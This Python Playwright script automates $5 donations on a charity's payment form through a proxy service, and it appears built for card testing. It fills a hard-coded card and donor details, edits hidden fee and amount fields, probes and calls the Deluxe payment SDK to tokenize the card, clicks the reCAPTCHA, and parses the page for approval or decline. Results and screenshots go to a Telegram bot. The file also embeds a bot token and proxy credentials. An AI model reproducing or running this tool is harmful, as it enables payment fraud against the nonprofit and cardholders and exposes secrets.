#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gift of Life Donation v17 — Direct Deluxe SDK tokenization
"""

import os
import time
import json
import requests
import traceback

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    os.system("pip install playwright")
    os.system("playwright install chromium")
    from playwright.sync_api import sync_playwright

# ═══════════════════════════════════════════════════
BOT_TOKEN = "8647240736:AAEGXuwmtZkUvAfbURX2BcyyuoWD-TekP_0"
CHAT_ID = 6843321125

BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"
BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"

TARGET_URL = "https://gift-of-life.org/make-a-donation/"

FIRST_NAME = "Wafa"
LAST_NAME = "Bro"
EMAIL = "wafabro980@gmail.com"
PHONE = "2019679866"
ADDRESS_1 = "W356"
ADDRESS_2 = "Apt 12"
CITY = "Carifnia"
STATE_VALUE = "1305"
ZIP = "90011"

CARD_NUMBER = "5178057879094972"
CARD_NAME = "Wafa Bro"
CARD_MONTH = "08"
CARD_YEAR = "2030"
CARD_CVV = "123"
CARD_TYPE = "MasterCard"

DONATION_AMOUNT = "5"

P = "_ArrevaOnlineDonationsPortlet_WAR_ArrevaOnlineDonationsPortlet_:form1:"


def sid(name):
    return f'[id="{P}{name}"]'


def tg_msg(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": text[:4000], "parse_mode": "HTML"},
            timeout=15
        )
    except Exception as e:
        print(f"TG msg error: {e}", flush=True)


def tg_photo(path, caption=""):
    try:
        with open(path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                data={"chat_id": CHAT_ID, "caption": caption[:1000]},
                files={"photo": f},
                timeout=30
            )
    except Exception as e:
        print(f"TG photo error: {e}", flush=True)


def tg_long(label, text, chunk=3500):
    tg_msg(f"{label} (len={len(text)})")
    for i in range(0, len(text), chunk):
        tg_msg(f"<pre>{text[i:i+chunk]}</pre>")
        time.sleep(0.3)


def find_donation_frame(page, total_seconds=120):
    start = time.time()
    attempt = 0
    while time.time() - start < total_seconds:
        attempt += 1
        for f in page.frames:
            try:
                if f.locator('[id*="datafirst"]').first.count() > 0:
                    tg_msg(f"✅ Found form in frame name='{f.name}'")
                    return f, attempt
            except Exception:
                pass
        time.sleep(2)
    return None, attempt


def fill_text_field(frame, field_suffix, value, label=""):
    try:
        el = frame.locator(sid(field_suffix)).first
        el.wait_for(state="visible", timeout=10000)
        el.fill(str(value), timeout=5000)
        el.evaluate("el => el.dispatchEvent(new Event('input',{bubbles:true}))")
        actual = frame.evaluate(
            "(id) => { const el = document.getElementById(id); return el ? el.value : null; }",
            f"{P}{field_suffix}"
        )
        tg_msg(f"{'✅' if actual == str(value) else '⚠️'} {label or field_suffix}: '{actual}'")
        return actual == str(value)
    except Exception as e:
        tg_msg(f"❌ {label or field_suffix}: {str(e)[:150]}")
        return False


def select_option_safe(frame, field_suffix, value, label=""):
    try:
        ok = frame.evaluate(
            """([id, val]) => {
                const el = document.getElementById(id);
                if (!el) return false;
                el.value = val;
                el.dispatchEvent(new Event('change', { bubbles: true }));
                return true;
            }""",
            [f"{P}{field_suffix}", value]
        )
        tg_msg(f"{'✅' if ok else '❌'} {label or field_suffix}: '{value}'")
        return ok
    except Exception as e:
        tg_msg(f"❌ {label or field_suffix}: {str(e)[:150]}")
        return False


def remove_processing_fee(frame):
    try:
        result = frame.evaluate(
            f"""() => {{
                const P = '{P}';
                const cb = document.getElementById(P + 'includeFee_input');
                if (!cb) return {{found: false}};
                if (cb.checked) cb.click();
                if (cb.checked) {{ cb.checked = false; cb.dispatchEvent(new Event('change', {{bubbles: true}})); }}
                return {{found: true, checked: cb.checked}};
            }}"""
        )
        tg_msg(f"✅ includeFee: {json.dumps(result, ensure_ascii=False)}")
        return result.get("checked") == False
    except Exception as e:
        tg_msg(f"❌ remove fee: {str(e)[:150]}")
        return False


def set_amount_exact(frame, amount):
    tg_msg(f"🔄 Setting exact amount = ${amount}")

    try:
        frame.evaluate(
            f"""() => {{
                const rb = document.getElementById('{P}rb_amount:4');
                if (rb) {{ rb.checked = true; rb.dispatchEvent(new Event('change', {{bubbles: true}})); }}
            }}"""
        )
        tg_msg("✅ Other radio checked")
    except Exception as e:
        tg_msg(f"⚠️ Other: {str(e)[:120]}")

    time.sleep(3)

    try:
        frame.evaluate(
            """(amt) => {
                const el = document.querySelector('input[id*="other_amount"]');
                if (!el) return false;
                el.value = amt;
                el.dispatchEvent(new Event('input', { bubbles: true }));
                el.dispatchEvent(new Event('change', { bubbles: true }));
                return true;
            }""",
            str(amount)
        )
        tg_msg(f"✅ other_amount = {amount}")
    except Exception as e:
        tg_msg(f"❌ other_amount: {str(e)[:120]}")

    time.sleep(3)
    remove_processing_fee(frame)
    time.sleep(2)

    total = float(amount)
    try:
        frame.evaluate(
            f"""(total) => {{
                const P = '{P}';
                const atp = document.getElementById(P + 'amount_to_pay');
                if (atp) atp.value = total.toFixed(2);
                const lt = document.getElementById('label_total_amount');
                if (lt) lt.value = '$ ' + total.toFixed(2);
                const lth = document.getElementById(P + 'label_total_hidden_amount');
                if (lth) lth.value = '$ ' + total.toFixed(2);
                const lp = document.getElementById(P + 'label_payment_amount');
                if (lp) lp.value = '$ ' + total.toFixed(2);
                const oao = document.getElementById(P + 'other_amount_on');
                if (oao) oao.value = 'true';
                const fa = document.getElementById(P + 'fee_amount');
                if (fa) fa.value = '0.00';
            }}""",
            total
        )
        tg_msg(f"✅ hidden fields updated: ${total:.2f}")
    except Exception as e:
        tg_msg(f"❌ hidden: {str(e)[:150]}")


# ═══════════════════════════════════════════════════
#  DELUXE SDK EXPLORATION
# ═══════════════════════════════════════════════════

def explore_deluxe_sdk(frame, page):
    """يستكشف Deluxe SDK — كل المتغيرات والدوال المتاحة"""
    tg_msg("🔍 Exploring Deluxe SDK...")

    # 1. استخرج JS files من Deluxe
    try:
        deluxe_scripts = frame.evaluate("""() => {
            return Array.from(document.querySelectorAll('script[src]'))
                .map(s => s.src)
                .filter(u => u.includes('deluxe') || u.includes('payments'));
        }""")
        tg_msg(f"📋 Deluxe scripts: {json.dumps(deluxe_scripts, ensure_ascii=False)}")
    except Exception as e:
        tg_msg(f"⚠️ scripts: {str(e)[:150]}")

    # 2. ابحث عن Deluxe global object
    try:
        deluxe_info = frame.evaluate("""() => {
            const result = {
                has_window_Deluxe: typeof window.Deluxe !== 'undefined',
                deluxe_keys: [],
                window_keys_with_deluxe: [],
                window_keys_with_payment: [],
                window_keys_with_token: [],
            };
            if (typeof window.Deluxe !== 'undefined') {
                try {
                    result.deluxe_keys = Object.keys(window.Deluxe);
                } catch(e) {}
            }
            for (const k of Object.keys(window)) {
                const kl = k.toLowerCase();
                if (kl.includes('deluxe')) result.window_keys_with_deluxe.push(k);
                if (kl.includes('payment') && kl.includes('sdk')) result.window_keys_with_payment.push(k);
                if (kl.includes('token') && (kl.includes('create') || kl.includes('cc') || kl.includes('card'))) 
                    result.window_keys_with_token.push(k);
            }
            return result;
        }""")
        tg_msg(f"📋 Deluxe globals: {json.dumps(deluxe_info, ensure_ascii=False)[:2000]}")
    except Exception as e:
        tg_msg(f"⚠️ globals: {str(e)[:150]}")

    # 3. ابحث عن iframe بتاع Deluxe
    try:
        deluxe_iframes = frame.evaluate("""() => {
            return Array.from(document.querySelectorAll('iframe'))
                .map(f => ({id: f.id, name: f.name, src: (f.src || '').slice(0, 200)}))
                .filter(f => f.src.includes('deluxe') || f.src.includes('payment') || f.src.includes('secure'));
        }""")
        tg_msg(f"📋 Deluxe iframes: {json.dumps(deluxe_iframes, ensure_ascii=False)}")
    except Exception as e:
        tg_msg(f"⚠️ iframes: {str(e)[:150]}")

    # 4. استخرج Deluxe JS content
    try:
        deluxe_js_urls = frame.evaluate("""() => {
            return Array.from(document.querySelectorAll('script[src]'))
                .map(s => s.src)
                .filter(u => u.includes('deluxe'));
        }""")
        for url in deluxe_js_urls:
            tg_msg(f"📥 Fetching: {url[-80:]}")
            try:
                resp = page.request.get(url, timeout=30000)
                if resp.status == 200:
                    js_content = resp.text()
                    # ابحث عن createToken/tokenize
                    keywords = ['createToken', 'tokenize', 'ccToken', 'paymentToken', 
                               'Deluxe.create', 'new Deluxe', 'window.Deluxe']
                    found = [k for k in keywords if k in js_content]
                    tg_msg(f"   keywords found: {found}")
                    
                    # ابعت أول 5000 حرف
                    if len(js_content) > 5000:
                        tg_long(f"📄 {url.split('/')[-1]} (first 5000)", js_content[:5000])
                    else:
                        tg_long(f"📄 {url.split('/')[-1]}", js_content)
            except Exception as e:
                tg_msg(f"   ⚠️ fetch: {str(e)[:100]}")
    except Exception as e:
        tg_msg(f"⚠️ fetch JS: {str(e)[:150]}")


def try_deluxe_tokenize(frame, page):
    """يحاول يستدعي Deluxe createToken بـ طرق مختلفة"""
    tg_msg("🔄 Trying Deluxe tokenization...")

    # نجرب كل الاحتمالات
    attempts = [
        # 1. window.Deluxe.createToken
        """async (card) => {
            if (typeof window.Deluxe === 'undefined') return {error: 'no Deluxe'};
            if (typeof window.Deluxe.createToken !== 'function') return {error: 'no createToken', keys: Object.keys(window.Deluxe)};
            return new Promise((resolve) => {
                try {
                    window.Deluxe.createToken(card, (err, result) => {
                        if (err) resolve({error: String(err)});
                        else resolve({success: true, result});
                    });
                } catch(e) { resolve({error: String(e)}); }
            });
        }""",
        
        # 2. Deluxe.tokenize
        """async (card) => {
            if (typeof window.Deluxe === 'undefined') return {error: 'no Deluxe'};
            if (typeof window.Deluxe.tokenize !== 'function') return {error: 'no tokenize'};
            return new Promise((resolve) => {
                try {
                    window.Deluxe.tokenize(card, (err, result) => {
                        if (err) resolve({error: String(err)});
                        else resolve({success: true, result});
                    });
                } catch(e) { resolve({error: String(e)}); }
            });
        }""",
        
        # 3. Deluxe.createPaymentToken
        """async (card) => {
            if (typeof window.Deluxe === 'undefined') return {error: 'no Deluxe'};
            if (typeof window.Deluxe.createPaymentToken !== 'function') return {error: 'no createPaymentToken'};
            return new Promise((resolve) => {
                try {
                    window.Deluxe.createPaymentToken(card, (err, result) => {
                        if (err) resolve({error: String(err)});
                        else resolve({success: true, result});
                    });
                } catch(e) { resolve({error: String(e)}); }
            });
        }""",
    ]

    card_data = {
        "cardNumber": CARD_NUMBER,
        "cvv": CARD_CVV,
        "expirationMonth": CARD_MONTH,
        "expirationYear": CARD_YEAR,
        "nameOnCard": CARD_NAME,
    }

    for i, attempt in enumerate(attempts):
        try:
            tg_msg(f"🔄 Attempt {i+1}...")
            result = frame.evaluate(attempt, card_data)
            tg_msg(f"📋 Attempt {i+1} result: {json.dumps(result, ensure_ascii=False)[:500] if result else 'null'}")
            
            if result and result.get("success"):
                return result.get("result")
        except Exception as e:
            tg_msg(f"⚠️ Attempt {i+1}: {str(e)[:150]}")
        
        time.sleep(1)

    return None


def inject_token(frame, token):
    """يحقن token في paymentToken hidden field"""
    try:
        ok = frame.evaluate(
            f"""(token) => {{
                const el = document.getElementById('{P}paymentToken');
                if (!el) return false;
                el.value = typeof token === 'string' ? token : JSON.stringify(token);
                el.dispatchEvent(new Event('input', {{bubbles: true}}));
                el.dispatchEvent(new Event('change', {{bubbles: true}}));
                return true;
            }}""",
            token
        )
        tg_msg(f"{'✅' if ok else '❌'} paymentToken injected")
        
        # تحقق
        actual = frame.evaluate(
            "(id) => { const el = document.getElementById(id); return el ? el.value : null; }",
            f"{P}paymentToken"
        )
        tg_msg(f"📋 paymentToken value: '{str(actual)[:80]}...'")
        return ok
    except Exception as e:
        tg_msg(f"❌ inject: {str(e)[:150]}")
        return False


# ═══════════════════════════════════════════════════
#  CAPTCHA
# ═══════════════════════════════════════════════════

def solve_captcha(frame, page):
    tg_msg("🔄 reCAPTCHA")
    try:
        token = frame.evaluate("""() => {
            const ta = document.querySelector('textarea[name="g-recaptcha-response"]');
            return ta ? ta.value : '';
        }""")
        tg_msg(f"📌 Token len = {len(token) if token else 0}")
        if token and len(token) > 20:
            return True
    except Exception:
        pass

    try:
        for f in page.frames:
            try:
                if "recaptcha/api2/anchor" in (f.url or ""):
                    cb = f.locator("#recaptcha-anchor").first
                    cb.wait_for(state="attached", timeout=8000)
                    cb.click(force=True, timeout=5000)
                    tg_msg("✅ Clicked reCAPTCHA")
                    break
            except Exception:
                continue

        for i in range(25):
            try:
                token = frame.evaluate("""() => {
                    const ta = document.querySelector('textarea[name="g-recaptcha-response"]');
                    return ta ? ta.value : '';
                }""")
                if token and len(token) > 20:
                    tg_msg(f"✅ reCAPTCHA solved! len={len(token)}")
                    return True
            except Exception:
                pass
            time.sleep(1)
        tg_msg("⚠️ reCAPTCHA still empty")
        return False
    except Exception as e:
        tg_msg(f"⚠️ reCAPTCHA: {str(e)[:150]}")
        return False


def handle_acceptance(page):
    tg_msg("🔄 Checking Acceptance popup...")
    for i in range(30):
        try:
            yes_btn = page.locator(".ui-confirmdialog-yes").first
            if yes_btn.count() > 0 and yes_btn.is_visible():
                tg_msg("✅ Clicking Yes (Continue)")
                yes_btn.click(timeout=5000)
                return True
        except Exception:
            pass
        try:
            cont = page.locator("button:has-text('Continue')").first
            if cont.count() > 0 and cont.is_visible():
                tg_msg("✅ Clicking Continue")
                cont.click(timeout=5000)
                return True
        except Exception:
            pass
        time.sleep(1)
    tg_msg("⚠️ No acceptance popup")
    return False


# ═══════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════

def run():
    tg_msg("🚀 Gift of Life Donation v17 — Deluxe SDK Direct")

    cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"

    try:
        pw = sync_playwright().start()
        browser = pw.chromium.connect_over_cdp(cdp_url, timeout=120000)
        tg_msg("✅ Connected to BrightData")
    except Exception as e:
        tg_msg(f"❌ Connect: {str(e)[:200]}")
        return

    context = browser.new_context(
        viewport={"width": 1366, "height": 900},
        user_agent=("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"),
        locale="en-US",
    )
    page = context.new_page()
    page.set_default_timeout(60000)

    tg_msg("🔄 [1] Opening...")
    try:
        page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=60000)
        time.sleep(10)
    except Exception as e:
        tg_msg(f"❌ Load: {str(e)[:200]}")
        return
    tg_msg("✅ Page loaded")

    tg_msg("🔄 [2] Finding form...")
    frame, attempts = find_donation_frame(page, 120)
    if not frame:
        try:
            page.reload(wait_until="domcontentloaded", timeout=60000)
            time.sleep(15)
        except Exception:
            pass
        frame, attempts = find_donation_frame(page, 90)
    if not frame:
        tg_msg("❌ not found")
        return
    tg_msg(f"✅ frame='{frame.name}'")
    time.sleep(5)

    # 3. استكشاف Deluxe
    tg_msg("🔄 [3] Exploring Deluxe SDK...")
    explore_deluxe_sdk(frame, page)

    # 4. المبلغ
    tg_msg("🔄 [4] Setting amount...")
    set_amount_exact(frame, DONATION_AMOUNT)

    # 5. بيانات المتبرع
    tg_msg("🔄 [5] Donor info...")
    fill_text_field(frame, "datafirst", FIRST_NAME, "First name")
    fill_text_field(frame, "datalast", LAST_NAME, "Last name")
    fill_text_field(frame, "email", EMAIL, "Email")
    fill_text_field(frame, "data_phone", PHONE, "Phone")
    fill_text_field(frame, "data_address_one", ADDRESS_1, "Address")
    fill_text_field(frame, "data_address_two", ADDRESS_2, "Apt/Suite")
    fill_text_field(frame, "data_address_city", CITY, "City")
    fill_text_field(frame, "data_address_zip", ZIP, "Zip")

    try:
        us_value = frame.evaluate(
            f"""() => {{
                const sel = document.querySelector('select[id="{P}data_Rcountry"]');
                if (!sel) return null;
                for (const o of sel.options) {{
                    const t = o.text.trim().toLowerCase();
                    if (t === 'united states' || t === 'usa' || t === 'us') return o.value;
                }}
                return null;
            }}"""
        )
        if us_value:
            select_option_safe(frame, "data_Rcountry", us_value, f"Country (US={us_value})")
    except Exception as e:
        tg_msg(f"⚠️ Country: {str(e)[:150]}")

    select_option_safe(frame, "data_Rstate", STATE_VALUE, "State (CA)")

    # 6. cardType + exp (كلهم select)
    select_option_safe(frame, "cardType", CARD_TYPE, "Card type")
    select_option_safe(frame, "expiration_date_month", CARD_MONTH, "Exp month")
    select_option_safe(frame, "expiration_date_year", CARD_YEAR, "Exp year")

    # 7. Deluxe tokenize
    tg_msg("🔄 [7] Attempting Deluxe tokenization...")
    token_result = try_deluxe_tokenize(frame, page)

    if token_result:
        tg_msg(f"✅ Got token: {json.dumps(token_result, ensure_ascii=False)[:500]}")
        # حاول تحقن
        if isinstance(token_result, dict):
            token_str = token_result.get("token") or token_result.get("paymentToken") or json.dumps(token_result)
        else:
            token_str = str(token_result)
        inject_token(frame, token_str)
    else:
        tg_msg("❌ No token obtained")
        # جرّب ملء الحقول بـ fill عادي بس (مش هيشتغل بس للتأكد)
        try:
            frame.locator(sid("cardNumber")).first.fill(CARD_NUMBER, timeout=3000)
            frame.locator(sid("cardCSV")).first.fill(CARD_CVV, timeout=3000)
            tg_msg("⚠️ Tried direct fill anyway")
        except Exception as e:
            tg_msg(f"⚠️ direct fill: {str(e)[:100]}")

    try:
        page.screenshot(path="/tmp/before_captcha.png", full_page=True)
        tg_photo("/tmp/before_captcha.png", "📸 Before captcha")
    except Exception:
        pass

    # 8. captcha
    captcha_ok = solve_captcha(frame, page)

    # 9. Pre-submit
    tg_msg("🔄 [9] Verifying...")
    try:
        vals = frame.evaluate(
            f"""() => {{
                const g = (n) => {{ const el = document.getElementById('{P}' + n); return el ? el.value : null; }};
                const cb = document.getElementById('{P}includeFee_input');
                return {{
                    card_num_len: (g('cardNumber') || '').length,
                    cvv_len: (g('cardCSV') || '').length,
                    payment_token_len: (g('paymentToken') || '').length,
                    card_type: g('cardType'),
                    amount_to_pay: g('amount_to_pay'),
                    includeFee: cb ? cb.checked : null,
                    recaptcha_len: (g('g-recaptcha-response') || '').length,
                }};
            }}"""
        )
        tg_msg(f"📋 Pre-submit:\n<pre>{json.dumps(vals, indent=1, ensure_ascii=False)}</pre>")
    except Exception as e:
        tg_msg(f"⚠️ Verify: {str(e)[:150]}")

    # 10. Submit
    tg_msg("🔄 [10] Clicking Submit...")
    try:
        btn = frame.locator(sid("j_idt1913")).first
        btn.wait_for(state="visible", timeout=10000)
        btn.click(timeout=5000)
        tg_msg("✅ Submit clicked")
    except Exception as e:
        tg_msg(f"⚠️ Submit: {str(e)[:150]}")

    time.sleep(5)

    # 11. Acceptance
    tg_msg("🔄 [11] Handling Acceptance...")
    handle_acceptance(page)

    time.sleep(15)

    # 12. النتيجة
    tg_msg("🔄 [12] Reading result...")
    time.sleep(10)
    try:
        page.screenshot(path="/tmp/result.png", full_page=True)
        tg_photo("/tmp/result.png", "📸 Result")
    except Exception:
        pass

    try:
        iframe_text = frame.evaluate("() => document.body.innerText")
        lines = []
        for line in iframe_text.split("\n"):
            l = line.strip()
            if any(k in l.lower() for k in ["success","approved","declin","error","invalid",
                                             "thank","confirm","failed","reject","captcha",
                                             "verified","otp","verification","limit","enter"]):
                lines.append(l)
        if lines:
            tg_msg("📊 Result:\n" + "\n".join(lines[:30]))
        else:
            tg_msg("⚠️ no keywords. preview:\n<pre>" + iframe_text[:2000] + "</pre>")
    except Exception as e:
        tg_msg(f"⚠️ read: {str(e)[:150]}")

    tg_msg("✅ DONE")

    try: context.close()
    except: pass
    try: browser.close()
    except: pass
    try: pw.stop()
    except: pass


if __name__ == "__main__":
    try:
        run()
    except Exception as e:
        tg_msg(f"❌ FATAL:\n{traceback.format_exc()[:3500]}")
